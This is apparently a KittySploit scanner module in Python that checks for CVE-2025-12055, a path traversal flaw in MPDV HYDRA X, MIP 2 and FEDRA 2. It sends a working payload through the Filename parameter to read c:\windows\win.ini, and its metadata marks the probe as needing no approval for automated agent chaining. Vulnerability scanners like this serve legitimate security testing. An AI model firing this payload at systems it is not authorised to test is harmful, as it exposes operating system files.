#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MPDV Mikrolab GmbH HYDRA X, MIP 2, and FEDRA 2 <= Maintenance Pack 36 with Servicepack 8 (week 36/2025) contai."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MPDV Mikrolab GmbH HYDRA X, MIP 2 & FEDRA 2 - Path Traversal Detection',
        'description': 'MPDV Mikrolab GmbH HYDRA X, MIP 2, and FEDRA 2 <= Maintenance Pack 36 with Servicepack 8 (week 36/2025) contain an unauthenticated local file disclosure vulnerability caused by improper validation of the "Filename" parameter in the public $SCHEMAS$ resource, letting attackers read arbitrary Windows OS files, exploit requires local access.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'lfi', 'mpdv', 'mikrolab', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2025/Oct/28',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-12055',
        ],
        'cve': 'CVE-2025-12055',
    }

    def run(self):
        r = self.http_request(method="GET", path='/hx/resources/public/$SCHEMAS$?Filename=c%3a%5cwindows%5cwin.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/octet-stream',)
        body_all = ('bit app support', 'fonts', 'extensions',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="MPDV Mikrolab GmbH HYDRA X, MIP 2 & FEDRA 2 - Path Traversal detected",
                path='/hx/resources/public/$SCHEMAS$?Filename=c%3a%5cwindows%5cwin.ini',
            )
            return True
        return False

